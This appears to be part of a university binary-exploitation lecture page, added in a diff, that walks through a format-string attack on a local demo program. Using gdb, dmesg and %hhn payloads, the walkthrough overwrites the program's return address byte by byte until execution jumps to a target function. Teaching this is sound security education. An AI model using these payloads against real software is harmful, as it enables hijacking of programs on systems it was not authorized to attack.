+Starting program: /home/user/git/si485-binary-exploits/lec/21/demo/plain_fmt AAAABBBBCCCCDDDD%1\$008x.%123\$00x.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x
+
+Breakpoint 1, main (argc=2, argv=0xbffff6d4) at plain_fmt.c:12
+12	  int a = 0xdeadbeef;
+</pre>
+<p>
+Now we're under gdb, let's print the entire stack frame:
+</p>
+<pre class="example">
+(gdb) x/12x $esp
+0xbffff610:	0x00000002	0xbffff6d4	0xbffff6e0	0xb7e4d42d
+0xbffff620:	0xb7fc43c4	0xb7fff000	0x080484db	0xb7fc4000
+0xbffff630:	0x080484d0	0x00000000	0x00000000	0xb7e33a83
+(gdb) x/x $ebp+0x4
+0xbffff63c:	0xb7e33a83
+</pre>
+<p>
+So the address of the return is at 0xbffff63c. And taking a full
+programatic step after the assignment of 0xdeadbeef, we can see what
+address deadbeef is at:
+</p>
+<pre class="example">
+(gdb) n
+14	  printf(argv[1]);
+(gdb) x/12x $esp
+0xbffff610:	0x00000002	0xbffff6d4	0xbffff6e0	0xb7e4d42d
+0xbffff620:	0xb7fc43c4	0xb7fff000	0x080484db	0xdeadbeef
+0xbffff630:	0x080484d0	0x00000000	0x00000000	0xb7e33a83
+</pre>
+
+<p>
+Let's take account of what we know: (1) The return address is at
+0xbffff63c and (2) the address of deadbeef is 0x10 less at
+0xbffff62c. Let's continue the program:
+</p>
+
+<pre class="example">
+(gdb) c
+Continuing.
+AAAABBBBCCCCDDDDbffff6d4.2f000000.bffff6d4.656d6f68.bffff6d4.6573752f.bffff6d4.69672f72.0xdeadbeef
+[Inferior 1 (process 2980) exited with code 012]
+</pre>
+
+<p>
+Looking at the output, we see the address 0xbffff6d4. This is a valid
+address and we can use this to calculate an offset from. So, the
+address of deadbeef is 0xa8 bytes offset (0xbfff6d4-0xa8), and the
+return address is offset 0x98 from that address (0xbffff6d4-0x98). 
+</p>
+
+<p>
+Now, we can take that information <i>outside</i> of gdb to try and
+determine what is going on and find the address we are looking for.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%123\$00x.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
+AAAABBBBCCCCDDDDbffff724.41414141.bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
+</pre>
+
+<p>
+Now we see the address 0xbffff724. Using the same calculation, the
+address of deadbeef should be at 0xbffff724-0xa8, or 0xbffff67c. And
+the address of return address should be 0xbffff68c. Let's see if we
+can cause some mischief:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./plain_fmt $(printf "\x8c\xf6\xff\xbf")BBBBCCCCDDDD%1\$008x.%123\$hhn.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
+???BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
+????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
+????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
+????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
+????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
+(...)
+</pre>
+<p>
+INFINITE LOOP! We are on to something here. Let's try some other
+addresses within the return address range.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./plain_fmt $(printf "\x8d\xf6\xff\xbf")BBBBCCCCDDDD%1\$008x.%123\$hhn.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
+????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[496993.978183] plain_fmt[3047]: segfault at 41007d0c ip b7e31983 sp bffff690 error 6 in libc-2.19.so[b7e1a000+1a8000]
+user@si485H-base:demo$ ./plain_fmt $(printf "\x8e\xf6\xff\xbf")BBBBCCCCDDDD%1\$008x.%123\$hhn.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
+????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[497001.269591] plain_fmt[3052]: segfault at b7193a83 ip b7193a83 sp bffff690 error 14
+user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")BBBBCCCCDDDD%1\$008x.%123\$hhn.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
+????BBBBCCCCDDDDbffff724..bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
+Segmentation fault (core dumped)
+</pre>
+
+<p>
+Notice the 0x19 that is moving through the return address range, that
+means we are in the money and we can start writing some bytes to that
+address.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline7" class="outline-3">
+<h3 id="orgheadline7"><span class="section-number-3">2.3</span> Writing Byes</h3>
+<div class="outline-text-3" id="text-2-3">
+<p>
+Like before, we want to write from most significant to least
+significant, so we can setup the following format:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$008x.%123\$hhn.%1\$008x.%124\$hhn.%1\$008x.%125\$hhn.%1\$008x.%126\$hhn.%7\$#08x 
+????????????????bffff724..bffff724..bffff724..bffff724..0xdeadbeef
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[497630.497343] plain_fmt[3118]: segfault at 19232d37 ip 19232d37 sp bffff690 error 14
+</pre>
+<p>
+And then look at the dmesg output to track our progress. The goal is
+to write to address of foo:
+</p>
+<pre class="example">
+user@si485H-base:demo$ objdump -d plain_fmt | grep foo
+0804847d &lt;foo&gt;:
+</pre>
+<p>
+The first byte we need to write is 0x08 and we are currently writing
+0x19, so we wrap around:
+</p>
+<pre class="example">
+user@si485H-base:demo$ python -c "print (0x100 - 0x19) + 0x08 + 8"
+247
+user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$247x.%123\$hhn.%1\$008x.%124\$hhn.%1\$008x.%125\$hhn.%1\$008x.%126\$hhn.%7\$#08x 
+????????????????                                                                                                                                                                                                                                               bffff724..bffff724..bffff724..bffff724..0xdeadbeef
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[497667.448239] plain_fmt[3127]: segfault at 8121c26 ip 08121c26 sp bffff690 error 14
+</pre>
+<p>
+Next, we need 0x04 but we are writing 12 when we need 04. 
+</p>
+<pre class="example">
+user@si485H-base:demo$ python -c "print (0x100 - 0x12) + 0x04 + 8"
+250
+user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$247x.%123\$hhn.%1\$250x.%124\$hhn.%1\$008x.%125\$hhn.%1\$008x.%126\$hhn.%7\$#08x 
+????????????????                                                                                                                                                                                                                                               bffff724..                                                                                                                                                                                                                                                  bffff724..bffff724..bffff724..0xdeadbeef
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[497734.158660] plain_fmt[3136]: segfault at 8040e18 ip 08040e18 sp bffff690 error 14 in plain_fmt[8048000+1000]
+</pre>
+<p>
+Next, we need 0x84 and we are writing 0e:
+</p>
+<pre class="example">
+user@si485H-base:demo$ python -c "print ((0x100 - 0x0e) + 0x84 + 8)%256"
+126
+user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$247x.%123\$hhn.%1\$250x.%124\$hhn.%1\$126x.%125\$hhn.%1\$008x.%126\$hhn.%7\$#08x 
+????????????????                                                                                                                                                                                                                                               bffff724..                                                                                                                                                                                                                                                  bffff724..                                                                                                                      bffff724..bffff724..0xdeadbeef
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[497815.575610] plain_fmt[3146]: segfault at 2 ip 00000002 sp bffff694 error 14 in plain_fmt[8048000+1000]
+</pre>
+
+<p>
+Uh oh &#x2026;. what happened? Well, now that we are wrting 0x080484.. WE
+are now in the valid address ranges for what we want to write. So we
+can no longer rely on the dmesg output directly. Instead, we jumped to
+a valid address and the segfaulted somewhere else.
+</p>
+
+<p>
+But all is not lost. Instead, we can now just do two calculations at
+once. Consider that the last time we wrote 126 bytes and the value in
+the least significant byte before that change was 0x18. That means
+that value should now be at: 0x18+126-8 = 0x8e. (The -8 was to account
+for the 8 bytes already printed within the format for 0x008). 
+</p>
+
+<p>
+If we are writing 0x8e, what we want to write 7d, that means for the
+last format we should be able to do this"
+</p>
+<pre class="example">
+user@si485H-base:demo$ python -c "print ((0x100 - 0x8e) + 0x7d + 8)%256"
+247
+user@si485H-base:demo$ ./plain_fmt $(printf "\x8f\xf6\xff\xbf")$(printf "\x8e\xf6\xff\xbf")$(printf "\x8d\xf6\xff\xbf")$(printf "\x8c\xf6\xff\xbf")%1\$247x.%123\$hhn.%1\$250x.%124\$hhn.%1\$126x.%125\$hhn.%1\$247x.%126\$hhn.%7\$#08x 
+????????????????                                                                                                                                                                                                                                               bffff724..                                                                                                                                                                                                                                                  bffff724..                                                                                                                      bffff724..                                                                                                                                                                                                                                               bffff724..0xdeadbeef
+Go Navy!
+Segmentation fault (core dumped)
+</pre>
+
+<p>
+And, "Go Navy!" Boom. 
+</p>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
